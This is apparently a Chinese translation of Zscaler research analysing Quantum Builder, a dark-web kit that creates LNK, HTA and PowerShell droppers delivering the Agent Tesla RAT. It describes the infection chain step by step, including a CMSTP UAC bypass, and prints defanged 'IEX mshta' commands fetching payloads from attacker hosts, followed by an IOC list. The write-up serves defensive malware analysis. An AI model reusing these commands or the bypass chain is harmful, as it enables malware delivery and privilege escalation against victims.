Zscaler 的研究人员发现暗网上正在出售名为 Quantum Builder 的构建工具，该工具可以投递 .NET 远控木马 Agent
Tesla。与过去的攻击行动相比，本次攻击转向使用 LNK 文件。

Quantum Builder 能够创建恶意文件，如 LNK、HTA 与 PowerShell，最后投递 Agent Tesla。攻击者使用复杂的技术来生成
Payload：

> 使用 CMSTP 绕过用户账户控制，以便以管理权限执行最终 Payload 并关闭 Windows Defender
>
> 利用集成了无文件攻击等多种攻击向量的多阶段感染链
>
> 在内存中执行 PowerShell 脚本以进行逃避检测
>
> 打开诱饵分散受害者的注意力

后文对感染链进行了深入分析，并对 Quantum Builder 生成的 Payload 进行了比较。

## 感染链

感染链始于鱼叉邮件，其中包含一个携带 GZIP 文档的 LNK 文件。执行 LNK 文件后，嵌入的 PowerShell 代码会生成 MSHTA
来执行远程服务器上的 HTA 文件。

![image.png-133.1kB](https://image.3001.net/images/20221002/1664726041_6339b41961bd408b12899.png!small)感染链

HTA 文件解密 PowerShell 脚本，在执行 AES 解密和 GZIP 解压缩后解密并加载另一个 PowerShell 脚本。解密后的
PowerShell 脚本是一个 Downloader，通过远程服务器下载 Agent Tesla，再使用 CMSTP 绕过 UAC 以管理权限执行。

## 技术分析

鱼叉邮件的主题为订单确认，如下所示：

![image.png-284.5kB](https://image.3001.net/images/20221002/1664726042_6339b41a1b61f5361c876.png!small)鱼叉邮件

邮件带有一个 GZIP 文件作为附件，与带有 PDF 图标的恶意 LNK 文件捆绑在一起。执行后 LNK 文件会运行混淆的 PowerShell 代码，经过
base64 解编码与异或解密得到执行命令 `IEX mshta
https[:]//filebin.net/njqyvfot61w0tu9a/ordr[.]hta`。

![image.png-181.9kB](https://image.3001.net/images/20221002/1664726042_6339b41ae306360908412.png!small)执行混淆代码

![image.png-95.2kB](https://image.3001.net/images/20221002/1664726043_6339b41ba39883a6c0dee.png!small)通过
MSHTA 执行远程服务器上的 HTA 文件

HTA 文件包含多个千余行的垃圾 VBS 函数，其中只有一个与恶意行为有关。

![image.png-87.5kB](https://image.3001.net/images/20221002/1664726044_6339b41c5c5d176b5de2d.png!small)HTA
主要函数

解密出来的 PowerShell 脚本如下所示：

![image.png-229.6kB](https://image.3001.net/images/20221002/1664726045_6339b41d1e67c149f1eaf.png!small)解密
PowerShell 代码

解密完成后，恶意函数就会通过 CreateObject() 创建一个 Wscript.Shell 对象，然后通过 Run 方法执行解密后的
PowerShell 脚本。

![image.png-249.5kB](https://image.3001.net/images/20221002/1664726045_6339b41dd910ba60ad869.png!small)PowerShell
代码执行

解密的代码以隐藏窗口的形式执行，解密后会获取另一个 PowerShell 代码。

![image.png-377.6kB](https://image.3001.net/images/20221002/1664726047_6339b41f4580de2025f13.png!small)执行新的
PowerShell 代码

IEX 函数执行 AES 解密与 GZIP 解压是关键的 PowerShell 代码：

> 从远程服务器下载 Agent Tesla 的 Payload
>
> 执行 CMSTP 绕过 UAC
>
> 通过操作文件属性隐藏 Agent Tesla

Agent Tesla 被硬编码命名为 `MuUQDuaFNoGmHQE.exe`，并且被最终执行：

![image.png-118.9kB](https://image.3001.net/images/20221002/1664726048_6339b4200e9a1f954b7a5.png!small)解密
PowerShell 代码

解密可获取 Agent Tesla 的部署地址：

![image.png-70.9kB](https://image.3001.net/images/20221002/1664726048_6339b420ae66cdbcc2847.png!small)URL
解密

![image.png-126.3kB](https://image.3001.net/images/20221002/1664726049_6339b4215827088997536.png!small)下载
Agent Tesla

通过 WriteAllBytes() 函数写入磁盘，路径为
`C:\Users\<username>\AppData\Roaming\MuUQDuaFNoGmHQE.exe`：

![image.png-48.2kB](https://image.3001.net/images/20221002/1664726050_6339b4224a80c059b542c.png!small)写入指定位置

Agent Tesla 二进制文件的路径作为参数传递给 PowerShell 脚本中的 CMSTP UAC Bypass
函数。该函数最初解码一个特别大的、base64 编码的数据块，如下所示：

![image.png-692.3kB](https://image.3001.net/images/20221002/1664726051_6339b423173e955f9062b.png!small)CMSTP
UAC Bypass

解码后的代码是基于 PowerShell 的 CMSTP UAC Bypass PoC，在
[GitHub](https://github.com/tylerapplebaum/CMSTP-UACBypass/blob/master/UACBypassCMSTP.ps1)上也能够找到。基于 PowerShell 的 CMSTP UAC 绕过
PoC 脚本在执行时会在 Temp 目录中写入恶意 INF 文件，其中 PowerShell 脚本中的 `$CommandToExecute`变量是
Agent Tesla 二进制文件的路径。

![image.png-265.3kB](https://image.3001.net/images/20221002/1664726052_6339b42409758bf736172.png!small)恶意
INF 文件

将 INF 文件写入临时目录后，PowerShell 代码会生成一个新进程 `cmstp.exe`，并以 `/au
$InfFileLocation`作为参数，然后安装恶意 INF 文件，如下所示：

![image.png-31.8kB](https://image.3001.net/images/20221002/1664726052_6339b424ea4bb44cb052c.png!small)恶意
INF 文件作为参数执行 CMSTP

在 cmstp.exe 安装 INF 文件时，RunPreSetupCommandsSection 参数中的命令将以管理权限执行。该脚本将 [ENTER]
按键发送到活动的窗口应用程序，以便使用 SendKeys.SendWait() 函数自动执行。

![image.png-14.4kB](https://image.3001.net/images/20221002/1664726053_6339b4256b85a3a5ca1ef.png!small)触发
UAC 绕过

当以恶意 INF 作为参数生成 cmstp.exe 时，就会以管理权限执行恶意软件，如下所示：

![image.png-89.9kB](https://image.3001.net/images/20221002/1664726054_6339b42613769b967d2a0.png!small)UAC
绕过并以管理权限执行

Agent Tesla 的 C&C 服务器被配置为：

![image.png-10kB](https://image.3001.net/images/20221002/1664726054_6339b426b6f6eccc72ee5.png!small)配置信息

C&C 通信如下所示：

![image.png-174.6kB](https://image.3001.net/images/20221002/1664726055_6339b4274bad73c8ade8c.png!small)C&C
通信

PowerShell 代码还通过操作隐藏文件属性来隐藏 Agent Tesla 二进制文件，如下所示：

![image.png-74.1kB](https://image.3001.net/images/20221002/1664726055_6339b427e575d4e352b0b.png!small)隐藏文件

### 攻击变化

感染链的另一个变种，LNK 文件被捆绑在 ZIP 压缩包中。通过命令 `Iex mShta
http://179[.]43[.]175[.]187/puao/PAYMENT.hta`来执行远程 HTA
文件。通过将整数转换为字符然后替换空格并进一步利用 MSHTA 从远程 URL 执行 HTA 文件，如下所示。

![image.png-507kB](https://image.3001.net/images/20221002/1664726056_6339b42898b137783e28f.png!small)通过
LNK 执行 HTA 文件

MSHTA 执行的 HTA 文件与之前感染链中使用的文件相同，加密数组转换为字符以形成可通过 Run 方法执行的 PowerShell 代码。

![image.png-255.8kB](https://image.3001.net/images/20221002/1664726057_6339b429d6827749cfada.png!small)HTA
文件解密 PowerShell 代码

除了 Run() 方法之外，在某些情况下，HTA 文件利用 ShellExecute() 方法执行 PowerShell 代码，如下所示：

![image.png-366.1kB](https://image.3001.net/images/20221002/1664726059_6339b42b21e693a862afe.png!small)通过
ShellExecute() 执行代码

下载落地后，使用 Start-Process() 从 AppData 路径执行 Agent Tesla。如果 Payload 的扩展名为
`.dll`，则它使用 rundll32.exe 将 DLL 加载到虚拟内存中。

![image.png-447.7kB](https://image.3001.net/images/20221002/1664726059_6339b42be4aad3bf2c5d3.png!small)通过解密的
PowerShell 代码下载并执行 Agent Tesla

在某些情况下，还会有在内存中解密的 PowerShell 代码。代码使用 Invoke-Item
函数下载并执行了一个诱饵文件，以此来分散受害者的注意力，如下所示：

![image.png-228.5kB](https://image.3001.net/images/20221002/1664726060_6339b42cb95d4bbaf378c.png!small)诱饵执行

C&C 服务器的配置为：

![image.png-10.3kB](https://image.3001.net/images/20221002/1664726061_6339b42da685496784069.png!small)配置信息

C&C 通信如下所示：

![image.png-235kB](https://image.3001.net/images/20221002/1664726062_6339b42e252b956f90477.png!small)C&C
通信

## Quantum

这些恶意文件都是由名为 Quantum Builder 的构建工具创建的，如下所示：

![image.png-257.1kB](https://image.3001.net/images/20221002/1664726063_6339b42f015a48245e6f4.png!small)Quantum
Builder

### HTA 生成工具

HTA 生成工具如下所示：

![image.png-165.5kB](https://image.3001.net/images/20221002/1664726064_6339b43003f7f1bb03044.png!small)HTA
生成工具

用户输入传递给 HTA Builder 函数以构造 HTA 文件，如下所示：

![image.png-439.4kB](https://image.3001.net/images/20221002/1664726064_6339b430c2af46e7d5b66.png!small)HTA
生成工具

将此代码与之前分析的 HTA 代码比较，可以确定 Payload 是由 Quantum Builder 生成的。

![image.png-121.9kB](https://image.3001.net/images/20221002/1664726065_6339b4319c219775be3ed.png!small)在野
HTA 文件

### LNK 生成工具

LNK 生成工具如下所示：

![image.png-118.9kB](https://image.3001.net/images/20221002/1664726066_6339b43264cae6868eb6a.png!small)LNK
生成工具

快捷方式的构造参数有 Description、IconLocation、Target Path、Arguments 和 WindowStyle，如下所示：

![image.png-365.1kB](https://image.3001.net/images/20221002/1664726067_6339b43342f46a0e7a61c.png!small)LNK
生成工具

将此代码与之前分析的 LNK 代码比较，可以确定 Payload 是由 Quantum Builder 生成的。

![image.png-72.7kB](https://image.3001.net/images/20221002/1664726068_6339b4346d6e2f1c8b51c.png!small)在野
LNK 文件

LNK 构建工具还可以生成 ISO 文件的 Payload，如下所示：

![image.png-72.9kB](https://image.3001.net/images/20221002/1664726069_6339b43516a300c215c2d.png!small)ISO
生成工具

Quantum Builder 已被攻击者多次利用，部署了多个恶意软件家族：

> RedLine Stealer
>
> IcedID
>
> GuLoader
>
> RemcosRAT and AsyncRAT

## 结论

攻击者会不断更新技术手段，利用各种恶意软件进行攻击。本次使用的 Agent Tesla 是最新的，Quantum Builder
已经被应用在各种攻击活动中投递各种恶意样本。

## IOC

> 3edfa0cf3b7d54c24013e4f0019dba20  
> bb914889d5edc6b56c666d2e44e1a437  
> 1adc0bd494cd42578ac8c8e726d5ad92  
> 31c341ad31224cc7d38a5c4e80ccb727  
> f931773a226809669cad91410a57267f  
> d9433faddcaca526b26f713e27e2505f  
> 213ada506251c477480bd14ea5507bf3  
> 0ebb9d422f8e86458d8fa7f66fe1d0f1  
> 563fda5da81a5e7818d771222e81f6c4  
> filebin[.]net/njqyvfot61w0tu9a/ordr[.]hta  
> filebin[.]net/yiob7vjw7pqow03r/RFQ_270622[.]hta  
> 179[.]43[.]175[.]187/puao/PAYMENT[.]hta  
> 179[.]43[.]175[.]187/puao/PO-M6888722[.]hta  
> filebin[.]net/e730ez2etlh3weer/MuUQDuaFNoGmHQE[.]exe  
> 179[.]43[.]175[.]187/puao/PAYMENTS[.]exe  
> 179[.]43[.]175[.]187/puao/PO-M6888757[.]exe  
> mail[.]thesharpening.com[.]au  
> ftp[.]qurvegraphics[.]com

## 参考来源

> [Zscaler](https://www.zscaler.com/blogs/security-research/agent-tesla-rat-> delivered-quantum-builder-new-ttps)

